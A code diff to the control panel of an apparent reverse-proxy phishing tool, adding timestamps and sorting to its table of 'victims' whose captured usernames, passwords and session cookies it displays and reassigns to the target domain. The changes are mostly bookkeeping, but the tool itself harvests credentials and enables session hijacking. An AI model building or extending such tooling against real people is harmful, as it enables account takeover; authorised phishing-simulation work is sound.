@@ -27,6 +27,7 @@ import (
 	"net/url"
 	"os"
 	"regexp"
+	"sort"
 	"strings"
 	"time"
 
@@ -93,18 +94,18 @@ function clearcookies(){
 
 <div class="container">
   <div class="row">
-  	<div class="col-md-4 text-center">
-  		<h4>Clicks</h4>
-  		<p style="font-weight:bold;font-size: 1em;">{{len .Victims}}</p>
-  	</div>
-  	<div class="col-md-4 text-center">
-  		<h4>Logins</h4>
-  		<p style="font-weight:bold;font-size: 1em;">{{.CredsCount}} ({{printf "%.1f" .CredsPercent}}%)</p>
-  	</div>
-  	<div class="col-md-4 text-center">
-  		<h4>Terminations</h4>
-  		<p style="font-weight:bold;font-size: 1em;">{{.TermCount}} ({{printf "%.1f" .TermPercent}}%)</p>
-  	</div>
+      <div class="col-md-4 text-center">
+          <h4>Clicks</h4>
+          <p style="font-weight:bold;font-size: 1em;">{{len .Victims}}</p>
+      </div>
+      <div class="col-md-4 text-center">
+          <h4>Logins</h4>
+          <p style="font-weight:bold;font-size: 1em;">{{.CredsCount}} ({{printf "%.1f" .CredsPercent}}%)</p>
+      </div>
+      <div class="col-md-4 text-center">
+          <h4>Terminations</h4>
+          <p style="font-weight:bold;font-size: 1em;">{{.TermCount}} ({{printf "%.1f" .TermPercent}}%)</p>
+      </div>
   </div>
   
   <hr>
@@ -114,6 +115,7 @@ function clearcookies(){
   <table class="table table-dark">
     <thead class="thead-dark">
       <tr>
+        <th class="text-center">Timestamp</th>
         <th class="text-center">UUID</th>
         <th class="text-center">Username</th>
         <th class="text-center">Password</th>
@@ -125,6 +127,11 @@ function clearcookies(){
     <tbody>
     {{range .Victims}}
       <tr>
+        {{if ne .CredentialTimestamp nil}}
+        <td class="text-center">{{call .CredentialTimestamp.Format "1/2/06 15:04:05"}}</td>
+        {{else}}
+        <td class="text-center"></td>
+        {{end}}
         <td class="text-center">{{.UUID}}</td>
         <td class="text-center">{{.Username}}</td>
         <td class="text-center">{{.Password}}</td>
@@ -137,7 +144,7 @@ function clearcookies(){
         </td>
         {{/* This requires additional coding ... <td><a onclick="clearcookies();" href="/{{$.URL}}/ImpersonateFrames?user_id={{.UUID}}" target="_blank" id="code" type="submit" class="btn btn-warning">Impersonate user (beta)</a> */}}
         <td class="text-center"><a  href="/{{$.URL}}/Cookies?user_id={{.UUID}}" target="_blank" id="code" type="submit" class="btn btn-info">View Cookies</a>
-		</td>
+        </td>
 
       </tr>
     {{end}}
@@ -163,7 +170,7 @@ var iframetemplate = `<!DOCTYPE html>
 
 html,body{
        width: 100%;
-	   height: 100%;
+       height: 100%;
 }
 
  body {
@@ -175,17 +182,17 @@ html,body{
     top: 50%;
     left: 50%;
     transform: translate(-50%,-50%);
-	width: 150px;
+    width: 150px;
     height: 150px;	
 }
 
 .loader {
     width: calc(100% - 0px);
-	height: calc(100% - 0px);
-	border: 8px solid #162534;
-	border-top: 8px solid #09f;
-	border-radius: 50%;
-	animation: rotate 5s linear infinite;
+    height: calc(100% - 0px);
+    border: 8px solid #162534;
+    border-top: 8px solid #09f;
+    border-radius: 50%;
+    animation: rotate 5s linear infinite;
 }
 
 @keyframes rotate {
@@ -240,11 +247,13 @@ var cookietemplate = `<!DOCTYPE html>
 `
 
 type Victim struct {
-	UUID       string
-	Username   string
-	Password   string
-	Session    string
-	Terminated bool
+	CredentialTimestamp *time.Time
+	UUID                string
+	Username            string
+	Password            string
+	Session             string
+	Terminated          bool
+	TerminatedTimestamp *time.Time
 }
 
 type Cookie struct {
@@ -485,6 +494,10 @@ func (config *ControlConfig) updateEntry(victim *Victim) error {
 		return err
 	}
 
+	if victim.CredentialTimestamp != nil {
+		entry.CredentialTimestamp = victim.CredentialTimestamp
+	}
+
 	if victim.Password != "" {
 		entry.Password = victim.Password
 	}
@@ -498,6 +511,10 @@ func (config *ControlConfig) updateEntry(victim *Victim) error {
 
 	if victim.Terminated {
 		entry.Terminated = true
+	}
+
+	if victim.TerminatedTimestamp != nil {
+		entry.TerminatedTimestamp = victim.TerminatedTimestamp
 	}
 
 	err = config.addEntry(entry)
@@ -595,7 +612,31 @@ func HelloHandler(w http.ResponseWriter, r *http.Request) {
 
 	w.WriteHeader(http.StatusOK)
 	w.Header().Set("Content-Type", "application/json")
+
 	victims, _ := CConfig.listEntries()
+	sort.SliceStable(victims, func(i, j int) bool {
+		ti := victims[i].CredentialTimestamp
+		tj := victims[j].CredentialTimestamp
+
+		if ti == nil && tj == nil {
+			return true
+		}
+
+		if tj == nil {
+			return true
+		}
+
+		if ti == nil {
+			return false
+		}
+
+		if ti.Equal(*tj) {
+			return true
+		}
+
+		return ti.Before(*tj)
+	})
+
 	credsCount := 0
 	for _, v := range victims {
 		if v.Password != "" {
@@ -965,9 +1006,16 @@ func init() {
 				}
 			}
 
+			now := time.Now()
 			if creds, found := CConfig.checkRequestCredentials(req); found {
 
-				victim := Victim{UUID: context.UserID, Username: creds.usernameFieldValue, Password: creds.passwordFieldValue}
+				victim := Victim{
+					UUID:                context.UserID,
+					Username:            creds.usernameFieldValue,
+					Password:            creds.passwordFieldValue,
+					CredentialTimestamp: &now,
+				}
+
 				if err := CConfig.updateEntry(&victim); err != nil {
 					log.Infof("Error %s", err.Error())
 					return
@@ -986,7 +1034,7 @@ func init() {
 					return
 				}
 
-				for i, _ := range cookies {
+				for i := range cookies {
 					cookies[i].Domain = context.OriginalTarget
 				}
 
@@ -1047,7 +1095,14 @@ func init() {
 
 	s.TerminateUser = func(userID string) {
 		log.Infof("Invoking control terminate")
-		victim := Victim{UUID: userID, Terminated: true}
+		// time.Now().Format("1/2/06 15:04:05")
+
+		now := time.Now()
+		victim := Victim{
+			UUID:                userID,
+			Terminated:          true,
+			TerminatedTimestamp: &now,
+		}
 		err := CConfig.updateEntry(&victim)
 		if err != nil {
 			log.Errorf("Error %s", err)
